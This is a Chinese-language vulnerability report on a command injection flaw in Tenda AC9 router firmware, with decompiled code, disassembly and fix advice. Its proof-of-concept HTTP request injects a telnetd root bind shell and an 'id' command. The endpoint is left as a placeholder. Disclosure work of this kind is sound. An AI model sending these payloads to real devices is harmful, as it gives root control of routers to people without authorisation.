# Tenda AC9 V15.03.05.19(6318)_CN — FUN_000384c8 命令注入漏洞分析

## 1. 概述

Tenda AC9 V15.03.05.19(6318)_CN 固件的 httpd 二进制中存在一处 OS 命令注入漏洞（CWE-78）。攻击者可通过构造 HTTP POST 请求，在 CGI 参数中注入 shell 元字符，以 root 权限远程执行任意系统命令。

## 2. 固件信息

- 设备：Tenda AC9 双频千兆无线路由器
- 固件版本：V15.03.05.19(6318)_CN
- 下载地址：https://www.tenda.com.cn/download/detail-1110.html
- 分析目标：`/bin/httpd`（ARM 32-bit，stripped，uClibc 动态链接）
- 固件解包：binwalk 提取 squashfs 根文件系统

## 3. 漏洞定位过程

通过 FuzzingBrain v2 自动化固件漏洞发现管线：

1. Ghidra 11.3.1 反编译 httpd，提取 1639 个函数的 C 伪代码
2. LLM Phase 2 识别 HTTP CGI 命令注入攻击面
3. LLM Phase 3 三视角交叉分析确认 FUN_000384c8 存在命令注入
4. 反向追踪调用链：FUN_000386cc（HTTP 参数解析）→ FUN_000384c8（漏洞点）
5. ARM 反汇编验证：确认 snprintf → doSystemCmd 调用链

## 4. 漏洞详情

### 4.1 调用链

```
HTTP POST 请求 → FUN_000386cc（CGI 分发器，解析参数）
    → FUN_000384c8（漏洞函数，拼接命令并执行）
        → snprintf() 将用户参数格式化为命令字符串
        → doSystemCmd() 执行（内部调用 system()）
```

### 4.2 漏洞代码（Ghidra 反编译）

```c
undefined4 FUN_000384c8(undefined4 param_1, undefined4 param_2, undefined4 param_3)
{
    int iVar1;
    char acStack_210 [516];    // 516 字节栈缓冲区

    // 打印参数（调试日志）
    printf(format_string, param_2, param_3, param_1);

    // 弱认证检查（可绕过）
    iVar1 = FUN_0003839c(param_1, param_2);
    if (iVar1 == 0) {
        return 0xffffffff;     // 检查失败返回
    }

    // ⚠️ 漏洞点：用户输入直接拼接到命令
    snprintf(acStack_210, 0x200,
             command_template,  // 命令模板（如 "cmd %s %s %s"）
             param_2,           // ← HTTP 参数，攻击者完全控制
             param_3,           // ← HTTP 参数，攻击者完全控制
             param_1);          // ← HTTP 参数，攻击者完全控制

    // ⚠️ 直接执行拼接后的命令
    doSystemCmd(acStack_210);   // → system(cmd)

    return 0;
}
```

### 4.3 ARM 汇编关键证据

```asm
; snprintf 调用（格式化命令字符串）
0x38540:    bl      0xf000   ; <snprintf@plt>

; ... 中间仅有寄存器移动操作，无任何过滤函数调用 ...

; doSystemCmd 调用（执行系统命令）
0x38560:    bl      0xf474   ; <doSystemCmd@plt>
```

PLT 符号确认：
```
snprintf@plt:   0x0000f000
doSystemCmd@plt: 0x0000f474
system@plt:     0x0000ed24
```

### 4.4 无输入过滤的证据

`snprintf` 调用与 `doSystemCmd` 调用之间的 ARM 指令序列中，不存在任何 `bl` 指令——证明没有调用字符串清理、过滤或验证函数。

## 5. 漏洞利用

### 5.1 攻击场景

攻击者向路由器的 HTTP 管理界面（80 端口）发送 POST 请求至目标 CGI 端点，在参数中注入 shell 元字符。

### 5.2 概念验证

```http
POST /goform/<目标端点> HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded

param1=;telnetd -p 9999 -l /bin/sh;&param2=;id > /www/out.txt;&param3=normal
```

`snprintf` 拼接后生成的命令字符串：
```bash
<命令模板前缀> ;telnetd -p 9999 -l /bin/sh; ;id > /www/out.txt; normal
```

Shell 解析为三条独立命令：
1. 原始命令（可能失败）
2. `telnetd -p 9999 -l /bin/sh` → 在 9999 端口开启后门 shell
3. `id > /www/out.txt` → 将执行结果写入 Web 可访问路径，确认命令执行

### 5.3 影响

- **权限**：httpd 以 root 运行，攻击者获得 root shell
- **持久化**：可通过命令注入写入启动脚本
- **横向移动**：获取路由器 shell 后可攻击内网其他设备
- **CVSS 3.1 评分**：9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## 6. 修复建议

1. 避免使用字符串拼接构造系统命令，改用参数化 API
2. 如无法避免，对 `;`, `|`, `&`, `$()`, `` ` ``, `&&`, `||`, `\n` 等 shell 元字符实施白名单过滤
3. 将 httpd 进程权限从 root 降至受限用户
4. 对所有 CGI 端点实施强制认证检查

## 7. 时间线

| 日期 | 事件 |
|------|------|
| 2026-06-06 | 获取固件并完成静态分析 |
| 2026-06-07 | LLM 管线交叉确认漏洞 |
| 2026-06-07 | ARM 反汇编验证并撰写分析报告 |
| 2026-06-07 | 提交 CVE 申请 |

## 8. 参考

- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- FuzzingBrain v2: 自动化固件漏洞发现管线
- Ghidra: https://github.com/NationalSecurityAgency/ghidra
